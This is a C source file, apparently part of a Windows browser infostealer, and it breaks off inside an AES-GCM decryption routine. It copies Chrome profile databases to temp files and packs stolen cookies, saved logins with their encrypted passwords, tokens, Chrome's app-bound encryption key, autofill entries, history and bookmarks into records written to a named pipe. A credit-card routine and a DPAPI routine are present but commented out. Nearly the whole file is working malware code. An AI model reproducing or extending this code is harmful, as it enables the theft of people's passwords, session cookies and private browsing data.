#include "Headers.h"


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

BOOL InitializeOutputPipe(OUT PHANDLE phPipe)
{
    if (!phPipe) return FALSE;
    if (!*phPipe && *phPipe != INVALID_HANDLE_VALUE) return TRUE;

    CHAR szPipeName[BUFFER_SIZE_32] = { 0 };

    GetPipeName(szPipeName, BUFFER_SIZE_32);

    *phPipe = CreateFileA(szPipeName, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

    return (*phPipe != INVALID_HANDLE_VALUE);
}

LPSTR BytesToHexString(IN PBYTE pbData, IN DWORD cbData)
{
    LPSTR   pszHexString    = NULL;
    DWORD   cchHexString    = 0x00;

    if (!pbData || cbData == 0)
        return NULL;

    cchHexString = (cbData * 2) + 1;

    if (!(pszHexString = (LPSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cchHexString)))
    {
        DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        return NULL;
    }

    for (DWORD i = 0; i < cbData; i++)
    {
        StringCchPrintfA(pszHexString + (i * 2), 3, "%02x", pbData[i]);
    }

    return pszHexString;
}

LPSTR DuplicateAnsiString(IN LPCSTR pszSrc)
{
    SIZE_T  cchSrc  = 0;
    SIZE_T  cbAlloc = 0;
    LPSTR   pszDst  = NULL;

    if (!pszSrc) return NULL;

    cchSrc  = (SIZE_T)lstrlenA(pszSrc);
    cbAlloc = (cchSrc + 1) * sizeof(CHAR);

    if (!(pszDst = (LPSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbAlloc)))
    {
        DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        return NULL;
    }

    StringCchCopyA(pszDst, cchSrc + 1, pszSrc);
    return pszDst;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static PDATA_PACKET CreatePacket(IN DWORD dwSignature, IN PBYTE pPacketData, IN DWORD dwPacketDataSize)
{
    PDATA_PACKET pktData = NULL;

    if (!(pktData = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, PACKET_SIZE(dwPacketDataSize))))
    {
        DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        return FALSE;
    }

    RtlCopyMemory(pktData->bData, pPacketData, dwPacketDataSize);

    pktData->dwSignature    = dwSignature;
    pktData->dwDataSize     = dwPacketDataSize;

    return pktData;
}

static BOOL SendDataToPipe(IN HANDLE hPipe, IN DWORD dwSignature, IN PBYTE pbData, IN DWORD cbDataSize)
{
    PDATA_PACKET    pktData         = NULL;
    DWORD           dwBytesWritten  = 0x00;
    DWORD           dwPacketSize    = PACKET_SIZE(cbDataSize);
    BOOL            bResult         = FALSE;

    if (!hPipe || hPipe == INVALID_HANDLE_VALUE || !pbData || cbDataSize == 0)
        return FALSE;

    if (!(pktData = CreatePacket(dwSignature, pbData, cbDataSize)))
        return FALSE;

    if (!WriteFile(hPipe, pktData, dwPacketSize, &dwBytesWritten, NULL))
    {
        DBGA("[!] WriteFile Failed With Error: %lu", GetLastError());
        goto _END_OF_FUNC;
    }

    FlushFileBuffers(hPipe);

    bResult = (dwBytesWritten == dwPacketSize);

_END_OF_FUNC:
    
    HEAP_FREE_SECURE(pktData, dwPacketSize);
    
    return bResult;
}

BOOL SendAppBoundKeyRecord(IN HANDLE hPipe, IN PBYTE pbKey, IN DWORD dwKeyLen)
{
    return SendDataToPipe(hPipe, PACKET_SIG_APP_BOUND_KEY, pbKey, dwKeyLen);
}

BOOL SendTokenRecord(IN HANDLE hPipe, IN LPCSTR szService, IN PBYTE pbToken, IN DWORD dwTokenLen, IN OPTIONAL PBYTE pbBindKey, IN OPTIONAL DWORD dwBindKeyLen)
{
    DWORD                   dwServiceLen  = lstrlenA(szService) + 1;
    DWORD                   dwTotalData   = dwServiceLen + dwTokenLen + dwBindKeyLen;
    DWORD                   dwPacketSize  = sizeof(TOKEN_RECORD_PACKET) + dwTotalData;
    PTOKEN_RECORD_PACKET    pRecord       = NULL;
    PBYTE                   pCursor       = NULL;
    BOOL                    bResult       = FALSE;

    if (!(pRecord = (PTOKEN_RECORD_PACKET)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwPacketSize)))
    {
        DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        return FALSE;
    }

    pRecord->dwServiceLen  = dwServiceLen;
    pRecord->dwTokenLen    = dwTokenLen;
    pRecord->dwBindKeyLen  = dwBindKeyLen;

    pCursor = pRecord->bData;
    RtlCopyMemory(pCursor, szService, dwServiceLen);  pCursor += dwServiceLen;
    RtlCopyMemory(pCursor, pbToken,   dwTokenLen);    pCursor += dwTokenLen;
    
    if (pbBindKey && dwBindKeyLen)
        RtlCopyMemory(pCursor, pbBindKey, dwBindKeyLen);

    bResult = SendDataToPipe(hPipe, PACKET_SIG_TOKEN, (PBYTE)pRecord, dwPacketSize);
    HEAP_FREE(pRecord);
    return bResult;
}

BOOL SendCookieRecord(IN HANDLE hPipe, IN LPCSTR szHostKey, IN LPCSTR szPath, IN LPCSTR szName, IN INT64 llExpiresUtc, IN PBYTE pbEncryptedValue, IN DWORD dwEncryptedValueLen)
{
    DWORD                   dwHostKeyLen    = lstrlenA(szHostKey) + 1;
    DWORD                   dwPathLen       = lstrlenA(szPath) + 1;
    DWORD                   dwNameLen       = lstrlenA(szName) + 1;
    DWORD                   dwTotalData     = dwHostKeyLen + dwPathLen + dwNameLen + dwEncryptedValueLen;
    DWORD                   dwPacketSize    = sizeof(COOKIE_RECORD_PACKET) + dwTotalData;
    PCOOKIE_RECORD_PACKET   pRecord         = NULL;
    PBYTE                   pCursor         = NULL;
    BOOL                    bResult         = FALSE;

    if (!(pRecord = (PCOOKIE_RECORD_PACKET)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwPacketSize)))
    {
        DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        return FALSE;
    }

    pRecord->dwHostKeyLen        = dwHostKeyLen;
    pRecord->dwPathLen           = dwPathLen;
    pRecord->dwNameLen           = dwNameLen;
    pRecord->llExpiresUtc        = llExpiresUtc;
    pRecord->dwEncryptedValueLen = dwEncryptedValueLen;

    pCursor = pRecord->bData;
    RtlCopyMemory(pCursor, szHostKey, dwHostKeyLen);              pCursor += dwHostKeyLen;
    RtlCopyMemory(pCursor, szPath, dwPathLen);                    pCursor += dwPathLen;
    RtlCopyMemory(pCursor, szName, dwNameLen);                    pCursor += dwNameLen;
    RtlCopyMemory(pCursor, pbEncryptedValue, dwEncryptedValueLen);

    bResult = SendDataToPipe(hPipe, PACKET_SIG_COOKIE, (PBYTE)pRecord, dwPacketSize);
    HEAP_FREE(pRecord);
    return bResult;
}

BOOL SendLoginRecord(IN HANDLE hPipe, IN LPCSTR szOriginUrl, IN LPCSTR szActionUrl, IN LPCSTR szUsername, IN PBYTE pbEncryptedPassword, IN DWORD dwEncryptedPasswordLen, IN INT64 llDateCreated, IN INT64 llDateLastUsed)
{
    DWORD                   dwOriginUrlLen  = lstrlenA(szOriginUrl) + 1;
    DWORD                   dwActionUrlLen  = lstrlenA(szActionUrl) + 1;
    DWORD                   dwUsernameLen   = lstrlenA(szUsername) + 1;
    DWORD                   dwTotalData     = dwOriginUrlLen + dwActionUrlLen + dwUsernameLen + dwEncryptedPasswordLen;
    DWORD                   dwPacketSize    = sizeof(LOGIN_RECORD_PACKET) + dwTotalData;
    PLOGIN_RECORD_PACKET    pRecord         = NULL;
    PBYTE                   pCursor         = NULL;
    BOOL                    bResult         = FALSE;

    if (!(pRecord = (PLOGIN_RECORD_PACKET)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwPacketSize)))
    {
        DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        return FALSE;
    }

    pRecord->dwOriginUrlLen  = dwOriginUrlLen;
    pRecord->dwActionUrlLen  = dwActionUrlLen;
    pRecord->dwUsernameLen   = dwUsernameLen;
    pRecord->dwPasswordLen   = dwEncryptedPasswordLen;
    pRecord->llDateCreated   = llDateCreated;
    pRecord->llDateLastUsed  = llDateLastUsed;

    pCursor = pRecord->bData;
    RtlCopyMemory(pCursor, szOriginUrl, dwOriginUrlLen);                  pCursor += dwOriginUrlLen;
    RtlCopyMemory(pCursor, szActionUrl, dwActionUrlLen);                  pCursor += dwActionUrlLen;
    RtlCopyMemory(pCursor, szUsername, dwUsernameLen);                    pCursor += dwUsernameLen;
    RtlCopyMemory(pCursor, pbEncryptedPassword, dwEncryptedPasswordLen);

    bResult = SendDataToPipe(hPipe, PACKET_SIG_LOGIN, (PBYTE)pRecord, dwPacketSize);
    HEAP_FREE(pRecord);
    return bResult;
}

/*
BOOL SendCreditCardRecord(IN HANDLE hPipe, IN LPCSTR szNameOnCard, IN LPCSTR szNickname, IN DWORD dwExpirationMonth, IN DWORD dwExpirationYear, IN INT64 llDateModified, IN PBYTE pbEncryptedCardNumber, IN DWORD dwEncryptedCardNumberLen)
{
    DWORD                       dwNameOnCardLen = lstrlenA(szNameOnCard) + 1;
    DWORD                       dwNicknameLen   = szNickname ? lstrlenA(szNickname) + 1 : 0;
    DWORD                       dwTotalData     = dwNameOnCardLen + dwNicknameLen + dwEncryptedCardNumberLen;
    DWORD                       dwPacketSize    = sizeof(CREDIT_CARD_RECORD_PACKET) + dwTotalData;
    PCREDIT_CARD_RECORD_PACKET  pRecord         = NULL;
    PBYTE                       pCursor         = NULL;
    BOOL                        bResult         = FALSE;

    if (!(pRecord = (PCREDIT_CARD_RECORD_PACKET)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwPacketSize)))
    {
        DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        return FALSE;
    }

    pRecord->dwNameOnCardLen        = dwNameOnCardLen;
    pRecord->dwNicknameLen          = dwNicknameLen;
    pRecord->dwExpirationMonth      = dwExpirationMonth;
    pRecord->dwExpirationYear       = dwExpirationYear;
    pRecord->llDateModified         = llDateModified;
    pRecord->dwEncryptedCardNumberLen = dwEncryptedCardNumberLen;

    pCursor = pRecord->bData;
    RtlCopyMemory(pCursor, szNameOnCard, dwNameOnCardLen);                    pCursor += dwNameOnCardLen;
    if (szNickname && dwNicknameLen)
        RtlCopyMemory(pCursor, szNickname, dwNicknameLen);                    pCursor += dwNicknameLen;
    RtlCopyMemory(pCursor, pbEncryptedCardNumber, dwEncryptedCardNumberLen);

    bResult = SendDataToPipe(hPipe, PACKET_SIG_CREDIT_CARD, (PBYTE)pRecord, dwPacketSize);
    HEAP_FREE(pRecord);
    return bResult;
}
*/

BOOL SendAutofillRecord(IN HANDLE hPipe, IN LPCSTR szName, IN LPCSTR szValue, IN INT64 llDateCreated, IN DWORD dwCount)
{
    DWORD                       dwNameLen       = lstrlenA(szName) + 1;
    DWORD                       dwValueLen      = lstrlenA(szValue) + 1;
    DWORD                       dwTotalData     = dwNameLen + dwValueLen;
    DWORD                       dwPacketSize    = sizeof(AUTOFILL_RECORD_PACKET) + dwTotalData;
    PAUTOFILL_RECORD_PACKET     pRecord         = NULL;
    PBYTE                       pCursor         = NULL;
    BOOL                        bResult         = FALSE;

    if (!(pRecord = (PAUTOFILL_RECORD_PACKET)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwPacketSize)))
    {
        DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        return FALSE;
    }

    pRecord->dwNameLen      = dwNameLen;
    pRecord->dwValueLen     = dwValueLen;
    pRecord->llDateCreated  = llDateCreated;
    pRecord->dwCount        = dwCount;

    pCursor = pRecord->bData;
    RtlCopyMemory(pCursor, szName, dwNameLen);      pCursor += dwNameLen;
    RtlCopyMemory(pCursor, szValue, dwValueLen);

    bResult = SendDataToPipe(hPipe, PACKET_SIG_AUTOFILL, (PBYTE)pRecord, dwPacketSize);
    HEAP_FREE(pRecord);
    return bResult;
}

BOOL SendHistoryRecord(IN HANDLE hPipe, IN LPCSTR szUrl, IN LPCSTR szTitle, IN DWORD dwVisitCount, IN INT64 llLastVisitTime)
{
    DWORD                   dwUrlLen        = lstrlenA(szUrl) + 1;
    DWORD                   dwTitleLen      = szTitle ? lstrlenA(szTitle) + 1 : 0;
    DWORD                   dwTotalData     = dwUrlLen + dwTitleLen;
    DWORD                   dwPacketSize    = sizeof(HISTORY_RECORD_PACKET) + dwTotalData;
    PHISTORY_RECORD_PACKET  pRecord         = NULL;
    PBYTE                   pCursor         = NULL;
    BOOL                    bResult         = FALSE;

    if (!(pRecord = (PHISTORY_RECORD_PACKET)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwPacketSize)))
    {
        DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        return FALSE;
    }

    pRecord->dwUrlLen           = dwUrlLen;
    pRecord->dwTitleLen         = dwTitleLen;
    pRecord->dwVisitCount       = dwVisitCount;
    pRecord->llLastVisitTime    = llLastVisitTime;

    pCursor = pRecord->bData;
    RtlCopyMemory(pCursor, szUrl, dwUrlLen);        pCursor += dwUrlLen;
    if (szTitle && dwTitleLen)
        RtlCopyMemory(pCursor, szTitle, dwTitleLen);

    bResult = SendDataToPipe(hPipe, PACKET_SIG_HISTORY, (PBYTE)pRecord, dwPacketSize);
    HEAP_FREE(pRecord);
    return bResult;
}

BOOL SendBookmarkRecord(IN HANDLE hPipe, IN LPCSTR szName, IN LPCSTR szUrl, IN INT64 llDateAdded)
{
    DWORD                       dwNameLen       = lstrlenA(szName) + 1;
    DWORD                       dwUrlLen        = lstrlenA(szUrl) + 1;
    DWORD                       dwTotalData     = dwNameLen + dwUrlLen;
    DWORD                       dwPacketSize    = sizeof(BOOKMARK_RECORD_PACKET) + dwTotalData;
    PBOOKMARK_RECORD_PACKET     pRecord         = NULL;
    PBYTE                       pCursor         = NULL;
    BOOL                        bResult         = FALSE;

    if (!(pRecord = (PBOOKMARK_RECORD_PACKET)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwPacketSize)))
    {
        DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        return FALSE;
    }

    pRecord->dwNameLen      = dwNameLen;
    pRecord->dwUrlLen       = dwUrlLen;
    pRecord->llDateAdded    = llDateAdded;

    pCursor = pRecord->bData;
    RtlCopyMemory(pCursor, szName, dwNameLen);      pCursor += dwNameLen;
    RtlCopyMemory(pCursor, szUrl, dwUrlLen);

    bResult = SendDataToPipe(hPipe, PACKET_SIG_BOOKMARK, (PBYTE)pRecord, dwPacketSize);
    HEAP_FREE(pRecord);
    return bResult;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

typedef struct _PATH_CACHE_ENTRY 
{
    CHAR szOriginalPath[BUFFER_SIZE_512];
    CHAR szTempPath[MAX_PATH];
} PATH_CACHE_ENTRY, *PPATH_CACHE_ENTRY;

#define PATH_CACHE_CAPACITY 8

static PATH_CACHE_ENTRY g_PathCache[PATH_CACHE_CAPACITY]        = { 0 };
static DWORD            g_dwPathCacheCount                      = 0x00;

LPSTR GetLocalAppDataPath(IN LPCSTR pszRelPath)
{
    CHAR    szFullPath[BUFFER_SIZE_512]     = { 0 };
    CHAR    szLocalAppData[MAX_PATH]        = { 0 };
    CHAR    szTempDir[MAX_PATH]             = { 0 };
    CHAR    szTempFile[MAX_PATH]            = { 0 };
    DWORD   dwAttribs                       = 0x00;

    if (!pszRelPath) return NULL;

    if (!GetEnvironmentVariableA("LOCALAPPDATA", szLocalAppData, MAX_PATH))
    {
        DBGA("[!] GetEnvironmentVariableA Failed With Error: %lu", GetLastError());
        return NULL;
    }

    if (FAILED(StringCchPrintfA(szFullPath, BUFFER_SIZE_512, "%s\\%s", szLocalAppData, pszRelPath)))
        return NULL;

    if ((dwAttribs = GetFileAttributesA(szFullPath)) == INVALID_FILE_ATTRIBUTES || (dwAttribs & FILE_ATTRIBUTE_DIRECTORY))
    {
        DBGA("[!] GetFileAttributesA Failed With Error: %lu", GetLastError());
        return NULL;
    }

    // Check Cache First
    for (DWORD i = 0; i < g_dwPathCacheCount; i++)
    {
        if (lstrcmpiA(g_PathCache[i].szOriginalPath, szFullPath) == 0)
        {
            return DuplicateAnsiString(g_PathCache[i].szTempPath);
        }
    }

    if (!GetTempPathA(MAX_PATH, szTempDir))
    {
        DBGA("[!] GetTempPathA Failed With Error: %lu", GetLastError());
        return NULL;
    }

    if (!GetTempFileNameA(szTempDir, "chr", 0, szTempFile))
    {
        DBGA("[!] GetTempFileNameA Failed With Error: %lu", GetLastError());
        return NULL;
    }

    if (!CopyFileA(szFullPath, szTempFile, FALSE))
    {
        DBGA("[!] CopyFileA Failed With Error: %lu", GetLastError());

        if (GetLastError() == ERROR_SHARING_VIOLATION)
            DBGA("[i] Chrome.exe Is Probably Running!");

        DeleteFileA(szTempFile);
        return NULL;
    }

    // DBGA("[v] Copied: '%s' To '%s'", szFullPath, szTempFile);

    // Add To Cache
    if (g_dwPathCacheCount < PATH_CACHE_CAPACITY)
    {
        StringCchCopyA(g_PathCache[g_dwPathCacheCount].szOriginalPath, BUFFER_SIZE_512, szFullPath);
        StringCchCopyA(g_PathCache[g_dwPathCacheCount].szTempPath, MAX_PATH, szTempFile);
        g_dwPathCacheCount++;
    }

    return DuplicateAnsiString(szTempFile);
}

VOID CleanupTempFiles()
{
    for (DWORD i = 0; i < g_dwPathCacheCount; i++)
    {
        if (g_PathCache[i].szTempPath[0])
            DeleteFileA(g_PathCache[i].szTempPath);
    }

    RtlSecureZeroMemory(g_PathCache, sizeof(g_PathCache));
    g_dwPathCacheCount = 0;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

BOOL ReadFileFromDiskA(IN LPCSTR pszFilePath, OUT PBYTE* ppFileBuffer, OUT PDWORD pdwFileSize)
{
    HANDLE  hFile       = INVALID_HANDLE_VALUE;
    DWORD   dwFileSize  = 0x00,
            dwBytesRead = 0x00;
    PBYTE   pbBuffer    = NULL;

    if (!pszFilePath || !ppFileBuffer || !pdwFileSize)
        return FALSE;

    *ppFileBuffer   = NULL;
    *pdwFileSize    = 0x00;

    if ((hFile = CreateFileA(pszFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
    {
        DBGA("[!] CreateFileA Failed With Error: %lu", GetLastError());
        return FALSE;
    }

    if ((dwFileSize = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE || dwFileSize == 0)
    {
        DBGA("[!] GetFileSize Failed With Error: %lu", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!(pbBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize + 1)))
    {
        DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!ReadFile(hFile, pbBuffer, dwFileSize, &dwBytesRead, NULL) || dwBytesRead != dwFileSize)
    {
        DBGA("[!] ReadFile Failed With Error: %lu", GetLastError());
        goto _END_OF_FUNC;
    }

    *ppFileBuffer  = pbBuffer;
    *pdwFileSize   = dwBytesRead;
    
_END_OF_FUNC:
    if (hFile != INVALID_HANDLE_VALUE)
        CloseHandle(hFile);
    if (pbBuffer && !*ppFileBuffer)
        HeapFree(GetProcessHeap(), 0x00, pbBuffer);
    return (*ppFileBuffer && *pdwFileSize) ? TRUE : FALSE;
}

LPSTR FindJsonStringValue(IN LPCSTR pszJson, IN DWORD cbJson, IN LPCSTR pszKey, OUT PDWORD pcbValue)
{
    CHAR    szSearchKey[BUFFER_SIZE_128]    = { 0 };
    LPCSTR  pszJsonEnd                      = NULL,
            pszKeyStart                     = NULL,
            pszValueStart                   = NULL,
            pszValueEnd                     = NULL;
    DWORD   dwKey                           = 0x00;

    if (!pszJson || !pszKey || !pcbValue)
        return NULL;

    *pcbValue   = 0;
    pszJsonEnd  = pszJson + cbJson;

    StringCbPrintfA(szSearchKey, sizeof(szSearchKey), "\"%s\"", pszKey);
    dwKey = (DWORD)lstrlenA(szSearchKey);

    pszKeyStart = pszJson;
    while (pszKeyStart < pszJsonEnd - dwKey)
    {
        pszKeyStart = (LPCSTR)memchr(pszKeyStart, '"', pszJsonEnd - pszKeyStart);
        if (!pszKeyStart)
            return NULL;

        if (memcmp(pszKeyStart, szSearchKey, dwKey) == 0)
            break;

        pszKeyStart++;
    }

    if (!pszKeyStart || pszKeyStart >= pszJsonEnd - dwKey)
        return NULL;

    pszKeyStart += dwKey;
    while (pszKeyStart < pszJsonEnd && (*pszKeyStart == ' ' || *pszKeyStart == '\t' || *pszKeyStart == '\n' || *pszKeyStart == '\r'))
        pszKeyStart++;

    if (pszKeyStart >= pszJsonEnd || *pszKeyStart != ':')
        return NULL;

    pszKeyStart++;

    while (pszKeyStart < pszJsonEnd && (*pszKeyStart == ' ' || *pszKeyStart == '\t' || *pszKeyStart == '\n' || *pszKeyStart == '\r'))
        pszKeyStart++;

    if (pszKeyStart >= pszJsonEnd || *pszKeyStart != '"')
        return NULL;

    pszValueStart = pszKeyStart + 1;

    pszValueEnd = pszValueStart;
    while (pszValueEnd < pszJsonEnd)
    {
        if (*pszValueEnd == '"' && *(pszValueEnd - 1) != '\\')
            break;

        pszValueEnd++;
    }

    if (pszValueEnd >= pszJsonEnd)
        return NULL;

    *pcbValue = (DWORD)(pszValueEnd - pszValueStart);
    return (LPSTR)pszValueStart;
}

LPSTR FindJsonArrayValue(IN LPCSTR pszJson, IN DWORD cbJson, IN LPCSTR pszKey, OUT PDWORD pcbValue)
{
    CHAR    szSearchKey[BUFFER_SIZE_128]    = { 0 };
    LPCSTR  pszJsonEnd                      = NULL;
    LPCSTR  pszKeyStart                     = NULL;
    LPCSTR  pszArrayStart                   = NULL;
    LPCSTR  pszArrayEnd                     = NULL;
    DWORD   dwKey                           = 0;
    INT     nBracketCount                   = 0;

    if (!pszJson || !pszKey || !pcbValue)
        return NULL;

    *pcbValue   = 0;
    pszJsonEnd  = pszJson + cbJson;

    StringCbPrintfA(szSearchKey, sizeof(szSearchKey), "\"%s\"", pszKey);
    dwKey = (DWORD)lstrlenA(szSearchKey);

    pszKeyStart = pszJson;
    while (pszKeyStart < pszJsonEnd - dwKey)
    {
        pszKeyStart = (LPCSTR)memchr(pszKeyStart, '"', pszJsonEnd - pszKeyStart);
        if (!pszKeyStart)
            return NULL;

        if (StrCmpNIA(pszKeyStart, szSearchKey, dwKey) == 0)
            break;

        pszKeyStart++;
    }

    if (!pszKeyStart || pszKeyStart >= pszJsonEnd - dwKey)
        return NULL;

    pszKeyStart += dwKey;

    while (pszKeyStart < pszJsonEnd && (*pszKeyStart == ' ' || *pszKeyStart == '\t' || *pszKeyStart == '\n' || *pszKeyStart == '\r'))
        pszKeyStart++;

    if (pszKeyStart >= pszJsonEnd || *pszKeyStart != ':')
        return NULL;

    pszKeyStart++;

    while (pszKeyStart < pszJsonEnd && (*pszKeyStart == ' ' || *pszKeyStart == '\t' || *pszKeyStart == '\n' || *pszKeyStart == '\r'))
        pszKeyStart++;

    if (pszKeyStart >= pszJsonEnd || *pszKeyStart != '[')
        return NULL;

    pszArrayStart = pszKeyStart + 1;
    pszArrayEnd = pszArrayStart;
    nBracketCount = 1;

    while (pszArrayEnd < pszJsonEnd && nBracketCount > 0)
    {
        if (*pszArrayEnd == '[') nBracketCount++;
        else if (*pszArrayEnd == ']') nBracketCount--;
        pszArrayEnd++;
    }

    if (nBracketCount != 0)
        return NULL;

    pszArrayEnd--;

    *pcbValue = (DWORD)(pszArrayEnd - pszArrayStart);
    return (LPSTR)pszArrayStart;
}

LPSTR FindNestedJsonValue(IN LPCSTR pszJson, IN DWORD cbJson, IN LPCSTR pszParentKey, IN LPCSTR pszChildKey, OUT PDWORD pcbValue)
{
    CHAR    szSearch[BUFFER_SIZE_128]   = { 0 };
    LPCSTR  pszJsonEnd                  = NULL,
            pszParent                   = NULL;
    DWORD   dwSearch                    = 0x00,
            dwRemaining                 = 0x00;

    if (!pszJson || !pszParentKey || !pszChildKey || !pcbValue)
        return NULL;

    *pcbValue   = 0x00;
    pszJsonEnd  = pszJson + cbJson;

    StringCbPrintfA(szSearch, sizeof(szSearch), "\"%s\"", pszParentKey);
    
    dwSearch = (DWORD)lstrlenA(szSearch);
    pszParent   = pszJson;

    while (pszParent < pszJsonEnd - dwSearch)
    {
        pszParent = (LPCSTR)memchr(pszParent, '"', pszJsonEnd - pszParent);
        if (!pszParent)
            return NULL;

        if (StrCmpNIA(pszParent, szSearch, dwSearch) == 0)
            break;

        pszParent++;
    }

    if (!pszParent || pszParent >= pszJsonEnd - dwSearch)
        return NULL;

#define MAX_NESTED_JSON_SEARCH 50000
    dwRemaining = (DWORD)(pszJsonEnd - pszParent);
    if (dwRemaining > MAX_NESTED_JSON_SEARCH)
        dwRemaining = MAX_NESTED_JSON_SEARCH;
#undef MAX_NESTED_JSON_SEARCH

    return FindJsonStringValue(pszParent, dwRemaining, pszChildKey, pcbValue);
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

PBYTE Base64Decode(IN LPCSTR pszInput, IN DWORD cbInput, OUT PDWORD pcbOutput)
{
    PBYTE   pbOutput    = NULL;
    DWORD   dwOutput    = 0x00;

    if (!pszInput || cbInput == 0 || !pcbOutput) return NULL;

    *pcbOutput = 0;

    if (!CryptStringToBinaryA(pszInput, cbInput, CRYPT_STRING_BASE64, NULL, &dwOutput, NULL, NULL))
    {
        DBGA("[!] CryptStringToBinaryA Failed With Error: %lu", GetLastError());
        return NULL;
    }

    if (!(pbOutput = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwOutput)))
    {
        DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        return NULL;
    }

    if (!CryptStringToBinaryA(pszInput, cbInput, CRYPT_STRING_BASE64, pbOutput, &dwOutput, NULL, NULL))
    {
        DBGA("[!] CryptStringToBinaryA Failed With Error: %lu", GetLastError());
        HEAP_FREE(pbOutput);
        return NULL;
    }

    *pcbOutput = dwOutput;
    return pbOutput;
}

/*
static BOOL DecryptDpapiBlob(IN PBYTE pBlob, IN DWORD dwBlob, OUT PBYTE* ppDecrypted, OUT PDWORD pcbDecrypted)
{
    DATA_BLOB   blobIn      = { 0 };
    DATA_BLOB   blobOut     = { 0 };

    if (!pBlob || dwBlob == 0 || !ppDecrypted || !pcbDecrypted)
        return FALSE;

    *ppDecrypted    = NULL;
    *pcbDecrypted   = 0;

    blobIn.pbData   = pBlob;
    blobIn.cbData   = dwBlob;

    if (!CryptUnprotectData(&blobIn, NULL, NULL, NULL, NULL, 0, &blobOut))
    {
        DBGA("[!] CryptUnprotectData Failed With Error: %lu", GetLastError());
        return FALSE;
    }

    *ppDecrypted    = blobOut.pbData;
    *pcbDecrypted   = blobOut.cbData;

    return TRUE;
}
*/

static BOOL DecryptAesGcm(IN PBYTE pbKey, IN ULONG cbKey, IN PBYTE pbIv, IN ULONG cbIv, IN PBYTE pbCiphertext, IN ULONG cbCiphertext, IN PBYTE pbTag, IN ULONG cbTag, OUT PBYTE* ppbPlaintext, OUT PDWORD pcbPlaintext)
{
    BCRYPT_ALG_HANDLE                       hAlg            = NULL;
    BCRYPT_KEY_HANDLE                       hKey            = NULL;
    PBYTE                                   pbPlaintext     = NULL;
    DWORD                                   dwPlaintext     = 0x00;
    ULONG                                   cbResult        = 0x00;
    NTSTATUS                                ntStatus        = 0x00;
    BOOL                                    bResult         = FALSE;
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO   AuthInfo        = { 0 };

    if (!pbKey || !pbIv || !pbCiphertext || !pbTag || !ppbPlaintext || !pcbPlaintext)
        return FALSE;

    if ((ntStatus = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0)) != 0)
    {
        DBGA("[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%08X", ntStatus);
        goto _END_OF_FUNC;
    }

    if ((ntStatus = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0)) != 0)
    {
        DBGA("[!] BCryptSetProperty Failed With Error: 0x%08X", ntStatus);
        goto _END_OF_FUNC;
    }

    if ((ntStatus = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, pbKey, cbKey, 0)) != 0)
    {
        DBGA("[!] BCryptGenerateSymmetricKey Failed With Error: 0x%08X", ntStatus);
        goto _END_OF_FUNC;
    }

    BCRYPT_INIT_AUTH_MODE_INFO(AuthInfo);
    AuthInfo.pbNonce    = pbIv;
    AuthInfo.cbNonce    = cbIv;
    AuthInfo.pbTag      = pbTag;
    AuthInfo.cbTag      = cbTag;

    dwPlaintext         = cbCiphertext;

    if (!(pbPlaintext = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwPlaintext + 1)))
    {
        DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        goto _END_OF_FUNC;
    }

